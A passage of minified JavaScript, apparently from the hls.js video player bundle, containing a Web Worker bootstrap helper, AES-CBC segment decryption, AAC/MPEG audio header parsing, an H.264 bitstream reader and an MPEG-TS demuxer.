                    function i(e) {
                        function t(i) { if (r[i]) return r[i].exports; var n = r[i] = { i: i, l: !1, exports: {} }; return e[i].call(n.exports, n, n.exports, t), n.l = !0, n.exports } var r = {};
                        t.m = e, t.c = r, t.i = function(e) { return e }, t.d = function(e, r, i) { t.o(e, r) || Object.defineProperty(e, r, { configurable: !1, enumerable: !0, get: i }) }, t.r = function(e) { Object.defineProperty(e, "__esModule", { value: !0 }) }, t.n = function(e) { var r = e && e.__esModule ? function() { return e.default } : function() { return e }; return t.d(r, "a", r), r }, t.o = function(e, t) { return Object.prototype.hasOwnProperty.call(e, t) }, t.p = "/", t.oe = function(e) { throw console.error(e), e }; var i = t(t.s = ENTRY_MODULE); return i.default || i }

                    function n(e) { return (e + "").replace(/[.?*+^$[\]\\(){}|-]/g, "\\$&") }

                    function a(e) { return !isNaN(1 * e) }

                    function s(e, t, i) { var s = {};
                        s[i] = []; var o = t.toString(),
                            l = o.match(/^function\s?\w*\(\w+,\s*\w+,\s*(\w+)\)/); if (!l) return s; for (var d, f = l[1], h = new RegExp("(\\\\n|\\W)" + n(f) + c, "g"); d = h.exec(o);) "dll-reference" !== d[3] && s[i].push(d[3]); for (h = new RegExp("\\(" + n(f) + '\\("(dll-reference\\s(' + u + '))"\\)\\)' + c, "g"); d = h.exec(o);) e[d[2]] || (s[i].push(d[1]), e[d[2]] = r(d[1]).m), s[d[2]] = s[d[2]] || [], s[d[2]].push(d[4]); for (var g = Object.keys(s), p = 0; p < g.length; p++)
                            for (var v = 0; v < s[g[p]].length; v++) a(s[g[p]][v]) && (s[g[p]][v] = 1 * s[g[p]][v]); return s }

                    function o(e) { return Object.keys(e).reduce(function(t, r) { return t || e[r].length > 0 }, !1) }

                    function l(e, t) { for (var r = { main: [t] }, i = { main: [] }, n = { main: {} }; o(r);)
                            for (var a = Object.keys(r), l = 0; l < a.length; l++) { var u = a[l],
                                    c = r[u],
                                    d = c.pop(); if (n[u] = n[u] || {}, !n[u][d] && e[u][d]) { n[u][d] = !0, i[u] = i[u] || [], i[u].push(d); for (var f = s(e, e[u][d], u), h = Object.keys(f), g = 0; g < h.length; g++) r[h[g]] = r[h[g]] || [], r[h[g]] = r[h[g]].concat(f[h[g]]) } }
                        return i } var u = "[\\.|\\-|\\+|\\w|/|@]+",
                        c = "\\(\\s*(/\\*.*?\\*/)?\\s*.*?(" + u + ").*?\\)";
                    e.exports = function(e, t) { t = t || {}; var n = { main: r.m },
                            a = t.all ? { main: Object.keys(n.main) } : l(n, e),
                            s = "";
                        Object.keys(a).filter(function(e) { return "main" !== e }).forEach(function(e) { for (var t = 0; a[e][t];) t++;
                            a[e].push(t), n[e][t] = "(function(module, exports, __webpack_require__) { module.exports = __webpack_require__; })", s = s + "var " + e + " = (" + i.toString().replace("ENTRY_MODULE", JSON.stringify(t)) + ")({" + a[e].map(function(t) { return JSON.stringify(t) + ": " + n[e][t].toString() }).join(",") + "});\n" }), s = s + "new ((" + i.toString().replace("ENTRY_MODULE", JSON.stringify(e)) + ")({" + a.main.map(function(e) { return JSON.stringify(e) + ": " + n.main[e].toString() }).join(",") + "}))(self);"; var o = new window.Blob([s], { type: "text/javascript" }); if (t.bare) return o; var u = window.URL || window.webkitURL || window.mozURL || window.msURL,
                            c = u.createObjectURL(o),
                            d = new window.Worker(c); return d.objectURL = c, d } }, "./src/crypt/decrypter.js": function(e, t, r) { "use strict";

                    function i(e) { var t = e.byteLength,
                            r = t && new DataView(e).getUint8(t - 1); return r ? e.slice(0, t - r) : e }
                    r.r(t); var n = function() {
                            function e(e, t) { this.subtle = e, this.aesIV = t } return e.prototype.decrypt = function(e, t) { return this.subtle.decrypt({ name: "AES-CBC", iv: this.aesIV }, t, e) }, e }(),
                        a = function() {
                            function e(e, t) { this.subtle = e, this.key = t } return e.prototype.expandKey = function() { return this.subtle.importKey("raw", this.key, { name: "AES-CBC" }, !1, ["encrypt", "decrypt"]) }, e }(),
                        s = a,
                        o = function() {
                            function e() { this.rcon = [0, 1, 2, 4, 8, 16, 32, 64, 128, 27, 54], this.subMix = [new Uint32Array(256), new Uint32Array(256), new Uint32Array(256), new Uint32Array(256)], this.invSubMix = [new Uint32Array(256), new Uint32Array(256), new Uint32Array(256), new Uint32Array(256)], this.sBox = new Uint32Array(256), this.invSBox = new Uint32Array(256), this.key = new Uint32Array(0), this.initTable() } var t = e.prototype; return t.uint8ArrayToUint32Array_ = function(e) { for (var t = new DataView(e), r = new Uint32Array(4), i = 0; i < 4; i++) r[i] = t.getUint32(4 * i); return r }, t.initTable = function() { var e = this.sBox,
                                    t = this.invSBox,
                                    r = this.subMix,
                                    i = r[0],
                                    n = r[1],
                                    a = r[2],
                                    s = r[3],
                                    o = this.invSubMix,
                                    l = o[0],
                                    u = o[1],
                                    c = o[2],
                                    d = o[3],
                                    f = new Uint32Array(256),
                                    h = 0,
                                    g = 0,
                                    p = 0; for (p = 0; p < 256; p++) f[p] = p < 128 ? p << 1 : p << 1 ^ 283; for (p = 0; p < 256; p++) { var v = g ^ g << 1 ^ g << 2 ^ g << 3 ^ g << 4;
                                    v = v >>> 8 ^ 255 & v ^ 99, e[h] = v, t[v] = h; var m = f[h],
                                        y = f[m],
                                        b = f[y],
                                        _ = 257 * f[v] ^ 16843008 * v;
                                    i[h] = _ << 24 | _ >>> 8, n[h] = _ << 16 | _ >>> 16, a[h] = _ << 8 | _ >>> 24, s[h] = _, _ = 16843009 * b ^ 65537 * y ^ 257 * m ^ 16843008 * h, l[v] = _ << 24 | _ >>> 8, u[v] = _ << 16 | _ >>> 16, c[v] = _ << 8 | _ >>> 24, d[v] = _, h ? (h = m ^ f[f[f[b ^ m]]], g ^= f[f[g]]) : h = g = 1 } }, t.expandKey = function(e) { for (var t = this.uint8ArrayToUint32Array_(e), r = !0, i = 0; i < t.length && r;) r = t[i] === this.key[i], i++; if (!r) { this.key = t; var n = this.keySize = t.length; if (4 !== n && 6 !== n && 8 !== n) throw new Error("Invalid aes key size=" + n); var a, s, o, l, u = this.ksRows = 4 * (n + 6 + 1),
                                        c = this.keySchedule = new Uint32Array(u),
                                        d = this.invKeySchedule = new Uint32Array(u),
                                        f = this.sBox,
                                        h = this.rcon,
                                        g = this.invSubMix,
                                        p = g[0],
                                        v = g[1],
                                        m = g[2],
                                        y = g[3]; for (a = 0; a < u; a++) a < n ? o = c[a] = t[a] : (l = o, a % n == 0 ? (l = l << 8 | l >>> 24, l = f[l >>> 24] << 24 | f[l >>> 16 & 255] << 16 | f[l >>> 8 & 255] << 8 | f[255 & l], l ^= h[a / n | 0] << 24) : n > 6 && a % n == 4 && (l = f[l >>> 24] << 24 | f[l >>> 16 & 255] << 16 | f[l >>> 8 & 255] << 8 | f[255 & l]), c[a] = o = (c[a - n] ^ l) >>> 0); for (s = 0; s < u; s++) a = u - s, l = 3 & s ? c[a] : c[a - 4], d[s] = s < 4 || a <= 4 ? l : p[f[l >>> 24]] ^ v[f[l >>> 16 & 255]] ^ m[f[l >>> 8 & 255]] ^ y[f[255 & l]], d[s] = d[s] >>> 0 } }, t.networkToHostOrderSwap = function(e) { return e << 24 | (65280 & e) << 8 | (16711680 & e) >> 8 | e >>> 24 }, t.decrypt = function(e, t, r, n) { for (var a, s, o, l, u, c, d, f, h, g, p, v, m, y, b = this.keySize + 6, _ = this.invKeySchedule, E = this.invSBox, S = this.invSubMix, T = S[0], w = S[1], A = S[2], R = S[3], P = this.uint8ArrayToUint32Array_(r), k = P[0], D = P[1], L = P[2], C = P[3], I = new Int32Array(e), O = new Int32Array(I.length), M = this.networkToHostOrderSwap; t < I.length;) { for (h = M(I[t]), g = M(I[t + 1]), p = M(I[t + 2]), v = M(I[t + 3]), u = h ^ _[0], c = v ^ _[1], d = p ^ _[2], f = g ^ _[3], m = 4, y = 1; y < b; y++) a = T[u >>> 24] ^ w[c >> 16 & 255] ^ A[d >> 8 & 255] ^ R[255 & f] ^ _[m], s = T[c >>> 24] ^ w[d >> 16 & 255] ^ A[f >> 8 & 255] ^ R[255 & u] ^ _[m + 1], o = T[d >>> 24] ^ w[f >> 16 & 255] ^ A[u >> 8 & 255] ^ R[255 & c] ^ _[m + 2], l = T[f >>> 24] ^ w[u >> 16 & 255] ^ A[c >> 8 & 255] ^ R[255 & d] ^ _[m + 3], u = a, c = s, d = o, f = l, m += 4;
                                    a = E[u >>> 24] << 24 ^ E[c >> 16 & 255] << 16 ^ E[d >> 8 & 255] << 8 ^ E[255 & f] ^ _[m], s = E[c >>> 24] << 24 ^ E[d >> 16 & 255] << 16 ^ E[f >> 8 & 255] << 8 ^ E[255 & u] ^ _[m + 1], o = E[d >>> 24] << 24 ^ E[f >> 16 & 255] << 16 ^ E[u >> 8 & 255] << 8 ^ E[255 & c] ^ _[m + 2], l = E[f >>> 24] << 24 ^ E[u >> 16 & 255] << 16 ^ E[c >> 8 & 255] << 8 ^ E[255 & d] ^ _[m + 3], m += 3, O[t] = M(a ^ k), O[t + 1] = M(l ^ D), O[t + 2] = M(o ^ L), O[t + 3] = M(s ^ C), k = h, D = g, L = p, C = v, t += 4 } return n ? i(O.buffer) : O.buffer }, t.destroy = function() { this.key = void 0, this.keySize = void 0, this.ksRows = void 0, this.sBox = void 0, this.invSBox = void 0, this.subMix = void 0, this.invSubMix = void 0, this.keySchedule = void 0, this.invKeySchedule = void 0, this.rcon = void 0 }, e }(),
                        l = o,
                        u = r("./src/errors.ts"),
                        c = r("./src/utils/logger.js"),
                        d = r("./src/events.js"),
                        f = r("./src/utils/get-self-scope.js"),
                        h = Object(f.getSelfScope)(),
                        g = function() {
                            function e(e, t, r) { var i = void 0 === r ? {} : r,
                                    n = i.removePKCS7Padding,
                                    a = void 0 === n || n; if (this.logEnabled = !0, this.observer = e, this.config = t, this.removePKCS7Padding = a, a) try { var s = h.crypto;
                                    s && (this.subtle = s.subtle || s.webkitSubtle) } catch (e) {}
                                this.disableWebCrypto = !this.subtle } var t = e.prototype; return t.isSync = function() { return this.disableWebCrypto && this.config.enableSoftwareAES }, t.decrypt = function(e, t, r, i) { var a = this; if (this.disableWebCrypto && this.config.enableSoftwareAES) { this.logEnabled && (c.logger.log("JS AES decrypt"), this.logEnabled = !1); var o = this.decryptor;
                                    o || (this.decryptor = o = new l), o.expandKey(t), i(o.decrypt(e, 0, r, this.removePKCS7Padding)) } else { this.logEnabled && (c.logger.log("WebCrypto AES decrypt"), this.logEnabled = !1); var u = this.subtle;
                                    this.key !== t && (this.key = t, this.fastAesKey = new s(u, t)), this.fastAesKey.expandKey().then(function(s) { new n(u, r).decrypt(e, s).catch(function(n) { a.onWebCryptoError(n, e, t, r, i) }).then(function(e) { i(e) }) }).catch(function(n) { a.onWebCryptoError(n, e, t, r, i) }) } }, t.onWebCryptoError = function(e, t, r, i, n) { this.config.enableSoftwareAES ? (c.logger.log("WebCrypto Error, disable WebCrypto API"), this.disableWebCrypto = !0, this.logEnabled = !0, this.decrypt(t, r, i, n)) : (c.logger.error("decrypting error : " + e.message), this.observer.trigger(d.default.ERROR, { type: u.ErrorTypes.MEDIA_ERROR, details: u.ErrorDetails.FRAG_DECRYPT_ERROR, fatal: !0, reason: e.message })) }, t.destroy = function() { var e = this.decryptor;
                                e && (e.destroy(), this.decryptor = void 0) }, e }();
                    t.default = g }, "./src/demux/demuxer-inline.js": function(e, t, r) { "use strict";

                    function i(e, t, r, i) { var n, a, s, o, l, u = navigator.userAgent.toLowerCase(),
                            c = i,
                            d = [96e3, 88200, 64e3, 48e3, 44100, 32e3, 24e3, 22050, 16e3, 12e3, 11025, 8e3, 7350]; return n = 1 + ((192 & t[r + 2]) >>> 6), (a = (60 & t[r + 2]) >>> 2) > d.length - 1 ? void e.trigger(y.default.ERROR, { type: b.ErrorTypes.MEDIA_ERROR, details: b.ErrorDetails.FRAG_PARSING_ERROR, fatal: !0, reason: "invalid ADTS sampling index:" + a }) : (o = (1 & t[r + 2]) << 2, o |= (192 & t[r + 3]) >>> 6, S.logger.log("manifest codec:" + i + ",ADTS data:type:" + n + ",sampleingIndex:" + a + "[" + d[a] + "Hz],channelConfig:" + o), /firefox/i.test(u) ? a >= 6 ? (n = 5, l = new Array(4), s = a - 3) : (n = 2, l = new Array(2), s = a) : -1 !== u.indexOf("android") ? (n = 2, l = new Array(2), s = a) : (n = 5, l = new Array(4), i && (-1 !== i.indexOf("mp4a.40.29") || -1 !== i.indexOf("mp4a.40.5")) || !i && a >= 6 ? s = a - 3 : ((i && -1 !== i.indexOf("mp4a.40.2") && (a >= 6 && 1 === o || /vivaldi/i.test(u)) || !i && 1 === o) && (n = 2, l = new Array(2)), s = a)), l[0] = n << 3, l[0] |= (14 & a) >> 1, l[1] |= (1 & a) << 7, l[1] |= o << 3, 5 === n && (l[1] |= (14 & s) >> 1, l[2] = (1 & s) << 7, l[2] |= 8, l[3] = 0), { config: l, samplerate: d[a], channelCount: o, codec: "mp4a.40." + n, manifestCodec: c }) }

                    function n(e, t) { return 255 === e[t] && 240 == (246 & e[t + 1]) }

                    function a(e, t) { return 1 & e[t + 1] ? 7 : 9 }

                    function s(e, t) { return (3 & e[t + 3]) << 11 | e[t + 4] << 3 | (224 & e[t + 5]) >>> 5 }

                    function o(e, t) { return !!(t + 1 < e.length && n(e, t)) }

                    function l(e, t) { if (o(e, t)) { var r = a(e, t); if (t + r >= e.length) return !1; var i = s(e, t); if (i <= r) return !1; var l = t + i; if (l === e.length || l + 1 < e.length && n(e, l)) return !0 } return !1 }

                    function u(e, t, r, n, a) { if (!e.samplerate) { var s = i(t, r, n, a);
                            e.config = s.config, e.samplerate = s.samplerate, e.channelCount = s.channelCount, e.codec = s.codec, e.manifestCodec = s.manifestCodec, S.logger.log("parsed codec:" + e.codec + ",rate:" + s.samplerate + ",nb channel:" + s.channelCount) } }

                    function c(e) { return 9216e4 / e }

                    function d(e, t, r, i, n) { var o, l, u, c = e.length; if (o = a(e, t), l = s(e, t), (l -= o) > 0 && t + o + l <= c) return u = r + i * n, { headerLength: o, frameLength: l, stamp: u } }

                    function f(e, t, r, i, n) { var a = c(e.samplerate),
                            s = d(t, r, i, n, a); if (s) { var o = s.stamp,
                                l = s.headerLength,
                                u = s.frameLength,
                                f = { unit: t.subarray(r + l, r + l + u), pts: o, dts: o }; return e.samples.push(f), { sample: f, length: u + l } } }

                    function h(e, t, r, i) { void 0 === r && (r = 1), void 0 === i && (i = !1); var n = e * t * r; return i ? Math.round(n) : n }

                    function g(e, t) { return void 0 === t && (t = !1), h(e, 1e3, 1 / H, t) }

                    function p(e, t) { return void 0 === t && (t = 1), h(e, H, 1 / t) }

                    function v(e, t) { var r; if (void 0 === t) return e; for (r = t < e ? -8589934592 : 8589934592; Math.abs(e - t) > 4294967296;) e += r; return e }
                    r.r(t); var m, y = r("./src/events.js"),
                        b = r("./src/errors.ts"),
                        _ = r("./src/crypt/decrypter.js"),
                        E = r("./src/polyfills/number.js"),
                        S = r("./src/utils/logger.js"),
                        T = r("./src/utils/get-self-scope.js"),
                        w = r("./src/demux/id3.js"),
                        A = function() {
                            function e(e, t, r) { this.observer = e, this.config = r, this.remuxer = t } var t = e.prototype; return t.resetInitSegment = function(e, t, r, i) { this._audioTrack = { container: "audio/adts", type: "audio", id: 0, sequenceNumber: 0, isAAC: !0, samples: [], len: 0, manifestCodec: t, duration: i, inputTimeScale: 9e4 } }, t.resetTimeStamp = function() {}, e.probe = function(e) { if (!e) return !1; for (var t = w.default.getID3Data(e, 0) || [], r = t.length, i = e.length; r < i; r++)
                                    if (l(e, r)) return S.logger.log("ADTS sync word found !"), !0;
                                return !1 }, t.append = function(e, t, r, i) { for (var n = this._audioTrack, a = w.default.getID3Data(e, 0) || [], s = w.default.getTimeStamp(a), l = Object(E.isFiniteNumber)(s) ? 90 * s : 9e4 * t, c = 0, d = l, h = e.length, g = a.length, p = [{ pts: d, dts: d, data: a }]; g < h - 1;)
                                    if (o(e, g) && g + 5 < h) { u(n, this.observer, e, g, n.manifestCodec); var v = f(n, e, g, l, c); if (!v) { S.logger.log("Unable to parse AAC frame"); break }
                                        g += v.length, d = v.sample.pts, c++ } else w.default.isHeader(e, g) ? (a = w.default.getID3Data(e, g), p.push({ pts: d, dts: d, data: a }), g += a.length) : g++;
                                this.remuxer.remux(n, { samples: [] }, { samples: p, inputTimeScale: 9e4 }, { samples: [] }, t, r, i) }, t.destroy = function() {}, e }(),
                        R = A,
                        P = r("./src/demux/mp4demuxer.js"),
                        k = { BitratesMap: [32, 64, 96, 128, 160, 192, 224, 256, 288, 320, 352, 384, 416, 448, 32, 48, 56, 64, 80, 96, 112, 128, 160, 192, 224, 256, 320, 384, 32, 40, 48, 56, 64, 80, 96, 112, 128, 160, 192, 224, 256, 320, 32, 48, 56, 64, 80, 96, 112, 128, 144, 160, 176, 192, 224, 256, 8, 16, 24, 32, 40, 48, 56, 64, 80, 96, 112, 128, 144, 160], SamplingRateMap: [44100, 48e3, 32e3, 22050, 24e3, 16e3, 11025, 12e3, 8e3], SamplesCoefficients: [
                                [0, 72, 144, 12],
                                [0, 0, 0, 0],
                                [0, 72, 144, 12],
                                [0, 144, 144, 12]
                            ], BytesInSlot: [0, 1, 1, 4], appendFrame: function(e, t, r, i, n) { if (!(r + 24 > t.length)) { var a = this.parseHeader(t, r); if (a && r + a.frameLength <= t.length) { var s = 9e4 * a.samplesPerFrame / a.sampleRate,
                                            o = i + n * s,
                                            l = { unit: t.subarray(r, r + a.frameLength), pts: o, dts: o }; return e.config = [], e.channelCount = a.channelCount, e.samplerate = a.sampleRate, e.samples.push(l), { sample: l, length: a.frameLength } } } }, parseHeader: function(e, t) { var r = e[t + 1] >> 3 & 3,
                                    i = e[t + 1] >> 1 & 3,
                                    n = e[t + 2] >> 4 & 15,
                                    a = e[t + 2] >> 2 & 3,
                                    s = e[t + 2] >> 1 & 1; if (1 !== r && 0 !== n && 15 !== n && 3 !== a) { var o = 3 === r ? 3 - i : 3 === i ? 3 : 4,
                                        l = 1e3 * k.BitratesMap[14 * o + n - 1],
                                        u = 3 === r ? 0 : 2 === r ? 1 : 2,
                                        c = k.SamplingRateMap[3 * u + a],
                                        d = e[t + 3] >> 6 == 3 ? 1 : 2,
                                        f = k.SamplesCoefficients[r][i],
                                        h = k.BytesInSlot[i],
                                        g = 8 * f * h; return { sampleRate: c, channelCount: d, frameLength: parseInt(f * l / c + s, 10) * h, samplesPerFrame: g } } }, isHeaderPattern: function(e, t) { return 255 === e[t] && 224 == (224 & e[t + 1]) && 0 != (6 & e[t + 1]) }, isHeader: function(e, t) { return !!(t + 1 < e.length && this.isHeaderPattern(e, t)) }, probe: function(e, t) { if (t + 1 < e.length && this.isHeaderPattern(e, t)) { var r = this.parseHeader(e, t),
                                        i = 4;
                                    r && r.frameLength && (i = r.frameLength); var n = t + i; if (n === e.length || n + 1 < e.length && this.isHeaderPattern(e, n)) return !0 } return !1 } },
                        D = k,
                        L = function() {
                            function e(e) { this.data = e, this.bytesAvailable = e.byteLength, this.word = 0, this.bitsAvailable = 0 } var t = e.prototype; return t.loadWord = function() { var e = this.data,
                                    t = this.bytesAvailable,
                                    r = e.byteLength - t,
                                    i = new Uint8Array(4),
                                    n = Math.min(4, t); if (0 === n) throw new Error("no bytes available");
                                i.set(e.subarray(r, r + n)), this.word = new DataView(i.buffer).getUint32(0), this.bitsAvailable = 8 * n, this.bytesAvailable -= n }, t.skipBits = function(e) { var t;
                                this.bitsAvailable > e ? (this.word <<= e, this.bitsAvailable -= e) : (e -= this.bitsAvailable, t = e >> 3, e -= t >> 3, this.bytesAvailable -= t, this.loadWord(), this.word <<= e, this.bitsAvailable -= e) }, t.readBits = function(e) { var t = Math.min(this.bitsAvailable, e),
                                    r = this.word >>> 32 - t; return e > 32 && S.logger.error("Cannot read more than 32 bits at a time"), this.bitsAvailable -= t, this.bitsAvailable > 0 ? this.word <<= t : this.bytesAvailable > 0 && this.loadWord(), t = e - t, t > 0 && this.bitsAvailable ? r << t | this.readBits(t) : r }, t.skipLZ = function() { var e; for (e = 0; e < this.bitsAvailable; ++e)
                                    if (0 != (this.word & 2147483648 >>> e)) return this.word <<= e, this.bitsAvailable -= e, e;
                                return this.loadWord(), e + this.skipLZ() }, t.skipUEG = function() { this.skipBits(1 + this.skipLZ()) }, t.skipEG = function() { this.skipBits(1 + this.skipLZ()) }, t.readUEG = function() { var e = this.skipLZ(); return this.readBits(e + 1) - 1 }, t.readEG = function() { var e = this.readUEG(); return 1 & e ? 1 + e >>> 1 : -1 * (e >>> 1) }, t.readBoolean = function() { return 1 === this.readBits(1) }, t.readUByte = function() { return this.readBits(8) }, t.readUShort = function() { return this.readBits(16) }, t.readUInt = function() { return this.readBits(32) }, t.skipScalingList = function(e) { var t, r, i = 8,
                                    n = 8; for (t = 0; t < e; t++) 0 !== n && (r = this.readEG(), n = (i + r + 256) % 256), i = 0 === n ? i : n }, t.readSPS = function() { var e, t, r, i, n, a, s, o = 0,
                                    l = 0,
                                    u = 0,
                                    c = 0,
                                    d = this.readUByte.bind(this),
                                    f = this.readBits.bind(this),
                                    h = this.readUEG.bind(this),
                                    g = this.readBoolean.bind(this),
                                    p = this.skipBits.bind(this),
                                    v = this.skipEG.bind(this),
                                    m = this.skipUEG.bind(this),
                                    y = this.skipScalingList.bind(this); if (d(), e = d(), f(5), p(3), d(), m(), 100 === e || 110 === e || 122 === e || 244 === e || 44 === e || 83 === e || 86 === e || 118 === e || 128 === e) { var b = h(); if (3 === b && p(1), m(), m(), p(1), g())
                                        for (a = 3 !== b ? 8 : 12, s = 0; s < a; s++) g() && y(s < 6 ? 16 : 64) }
                                m(); var _ = h(); if (0 === _) h();
                                else if (1 === _)
                                    for (p(1), v(), v(), t = h(), s = 0; s < t; s++) v();
                                m(), p(1), r = h(), i = h(), n = f(1), 0 === n && p(1), p(1), g() && (o = h(), l = h(), u = h(), c = h()); var E = [1, 1]; if (g() && g()) { switch (d()) {
                                        case 1:
                                            E = [1, 1]; break;
                                        case 2:
                                            E = [12, 11]; break;
                                        case 3:
                                            E = [10, 11]; break;
                                        case 4:
                                            E = [16, 11]; break;
                                        case 5:
                                            E = [40, 33]; break;
                                        case 6:
                                            E = [24, 11]; break;
                                        case 7:
                                            E = [20, 11]; break;
                                        case 8:
                                            E = [32, 11]; break;
                                        case 9:
                                            E = [80, 33]; break;
                                        case 10:
                                            E = [18, 11]; break;
                                        case 11:
                                            E = [15, 11]; break;
                                        case 12:
                                            E = [64, 33]; break;
                                        case 13:
                                            E = [160, 99]; break;
                                        case 14:
                                            E = [4, 3]; break;
                                        case 15:
                                            E = [3, 2]; break;
                                        case 16:
                                            E = [2, 1]; break;
                                        case 255:
                                            E = [d() << 8 | d(), d() << 8 | d()] } } return { width: Math.ceil(16 * (r + 1) - 2 * o - 2 * l), height: (2 - n) * (i + 1) * 16 - (n ? 2 : 4) * (u + c), pixelRatio: E } }, t.readSliceType = function() { return this.readUByte(), this.readUEG(), this.readUEG() }, e }(),
                        C = L,
                        I = function() {
                            function e(e, t, r, i) { this.decryptdata = r, this.discardEPB = i, this.decrypter = new _.default(e, t, { removePKCS7Padding: !1 }) } var t = e.prototype; return t.decryptBuffer = function(e, t) { this.decrypter.decrypt(e, this.decryptdata.key.buffer, this.decryptdata.iv.buffer, t) }, t.decryptAacSample = function(e, t, r, i) { var n = e[t].unit,
                                    a = n.subarray(16, n.length - n.length % 16),
                                    s = a.buffer.slice(a.byteOffset, a.byteOffset + a.length),
                                    o = this;
                                this.decryptBuffer(s, function(a) { a = new Uint8Array(a), n.set(a, 16), i || o.decryptAacSamples(e, t + 1, r) }) }, t.decryptAacSamples = function(e, t, r) { for (;; t++) { if (t >= e.length) return void r(); if (!(e[t].unit.length < 32)) { var i = this.decrypter.isSync(); if (this.decryptAacSample(e, t, r, i), !i) return } } }, t.getAvcEncryptedData = function(e) { for (var t = 16 * Math.floor((e.length - 48) / 160) + 16, r = new Int8Array(t), i = 0, n = 32; n <= e.length - 16; n += 160, i += 16) r.set(e.subarray(n, n + 16), i); return r }, t.getAvcDecryptedUnit = function(e, t) { t = new Uint8Array(t); for (var r = 0, i = 32; i <= e.length - 16; i += 160, r += 16) e.set(t.subarray(r, r + 16), i); return e }, t.decryptAvcSample = function(e, t, r, i, n, a) { var s = this.discardEPB(n.data),
                                    o = this.getAvcEncryptedData(s),
                                    l = this;
                                this.decryptBuffer(o.buffer, function(o) { n.data = l.getAvcDecryptedUnit(s, o), a || l.decryptAvcSamples(e, t, r + 1, i) }) }, t.decryptAvcSamples = function(e, t, r, i) { for (;; t++, r = 0) { if (t >= e.length) return void i(); for (var n = e[t].units; !(r >= n.length); r++) { var a = n[r]; if (!(a.data.length <= 48 || 1 !== a.type && 5 !== a.type)) { var s = this.decrypter.isSync(); if (this.decryptAvcSample(e, t, r, i, a, s), !s) return } } } }, e }(),
                        O = I,
                        M = { video: 1, audio: 2, id3: 3, text: 4 },
                        x = function() {
                            function e(e, t, r, i) { this.observer = e, this.config = r, this.typeSupported = i, this.remuxer = t, this.sampleAes = null, this.pmtUnknownTypes = {} } var t = e.prototype; return t.setDecryptData = function(e) { null != e && null != e.key && "SAMPLE-AES" === e.method ? this.sampleAes = new O(this.observer, this.config, e, this.discardEPB) : this.sampleAes = null }, e.probe = function(t) { var r = e._syncOffset(t); return !(r < 0) && (r && S.logger.warn("MPEG2-TS detected but first sync word found @ offset " + r + ", junk ahead ?"), !0) }, e._syncOffset = function(e) { for (var t = Math.min(1e3, e.length - 564), r = 0; r < t;) { if (71 === e[r] && 71 === e[r + 188] && 71 === e[r + 376]) return r;
                                    r++ } return -1 }, e.createTrack = function(e, t) { return { container: "video" === e || "audio" === e ? "video/mp2t" : void 0, type: e, id: M[e], pid: -1, inputTimeScale: 9e4, sequenceNumber: 0, samples: [], dropped: "video" === e ? 0 : void 0, isAAC: "audio" === e || void 0, duration: "audio" === e ? t : void 0 } }, t.resetInitSegment = function(t, r, i, n) { this.pmtParsed = !1, this._pmtId = -1, this.pmtUnknownTypes = {}, this._avcTrack = e.createTrack("video", n), this._audioTrack = e.createTrack("audio", n), this._id3Track = e.createTrack("id3", n), this._txtTrack = e.createTrack("text", n), this.aacOverFlow = null, this.aacLastPTS = null, this.avcSample = null, this.audioCodec = r, this.videoCodec = i, this._duration = n }, t.resetTimeStamp = function() {}, t.append = function(t, r, i, n) { var a, s, o, l, u, c = t.length,
                                    d = !1;
                                this.pmtUnknownTypes = {}, this.contiguous = i; var f = this.pmtParsed,
                                    h = this._avcTrack,
                                    g = this._audioTrack,
                                    p = this._id3Track,
                                    v = h.pid,
                                    m = g.pid,
                                    _ = p.pid,
                                    E = this._pmtId,
                                    T = h.pesData,
                                    w = g.pesData,
                                    A = p.pesData,
                                    R = this._parsePAT,
                                    P = this._parsePMT.bind(this),
                                    k = this._parsePES,
                                    D = this._parseAVCPES.bind(this),
                                    L = this._parseAACPES.bind(this),
                                    C = this._parseMPEGPES.bind(this),
                                    I = this._parseID3PES.bind(this),
                                    O = e._syncOffset(t); for (c -= (c + O) % 188, a = O; a < c; a += 188)
                                    if (71 === t[a]) { if (s = !!(64 & t[a + 1]), o = ((31 & t[a + 1]) << 8) + t[a + 2], (48 & t[a + 3]) >> 4 > 1) { if ((l = a + 5 + t[a + 4]) === a + 188) continue } else l = a + 4; switch (o) {
                                            case v:
                                                s && (T && (u = k(T)) && D(u, !1), T = { data: [], size: 0 }), T && (T.data.push(t.subarray(l, a + 188)), T.size += a + 188 - l); break;
                                            case m:
                                                s && (w && (u = k(w)) && (g.isAAC ? L(u) : C(u)), w = { data: [], size: 0 }), w && (w.data.push(t.subarray(l, a + 188)), w.size += a + 188 - l); break;
                                            case _:
                                                s && (A && (u = k(A)) && I(u), A = { data: [], size: 0 }), A && (A.data.push(t.subarray(l, a + 188)), A.size += a + 188 - l); break;
                                            case 0:
                                                s && (l += t[l] + 1), E = this._pmtId = R(t, l); break;
                                            case E:
                                                s && (l += t[l] + 1); var M = P(t, l, !0 === this.typeSupported.mpeg || !0 === this.typeSupported.mp3, null != this.sampleAes);
                                                v = M.avc, v > 0 && (h.pid = v), m = M.audio, m > 0 && (g.pid = m, g.isAAC = M.isAAC), _ = M.id3, _ > 0 && (p.pid = _), d && !f && (S.logger.log("reparse from beginning"), d = !1, a = O - 188), f = this.pmtParsed = !0; break;
                                            case 17:
                                            case 8191:
                                                break;
                                            default:
                                                d = !0 } } else this.observer.trigger(y.default.ERROR, { type: b.ErrorTypes.MEDIA_ERROR, details: b.ErrorDetails.FRAG_PARSING_ERROR, fatal: !1, reason: "TS packet did not start with 0x47" });
                                T && (u = k(T)) ? (D(u, !0), h.pesData = null) : h.pesData = T, w && (u = k(w)) ? (g.isAAC ? L(u) : C(u), g.pesData = null) : (w && w.size && S.logger.log("last AAC PES packet truncated,might overlap between fragments"), g.pesData = w), A && (u = k(A)) ? (I(u), p.pesData = null) : p.pesData = A, null == this.sampleAes ? this.remuxer.remux(g, h, p, this._txtTrack, r, i, n) : this.decryptAndRemux(g, h, p, this._txtTrack, r, i, n) }, t.decryptAndRemux = function(e, t, r, i, n, a, s) { if (e.samples && e.isAAC) { var o = this;
                                    this.sampleAes.decryptAacSamples(e.samples, 0, function() { o.decryptAndRemuxAvc(e, t, r, i, n, a, s) }) } else this.decryptAndRemuxAvc(e, t, r, i, n, a, s) }, t.decryptAndRemuxAvc = function(e, t, r, i, n, a, s) { if (t.samples) { var o = this;
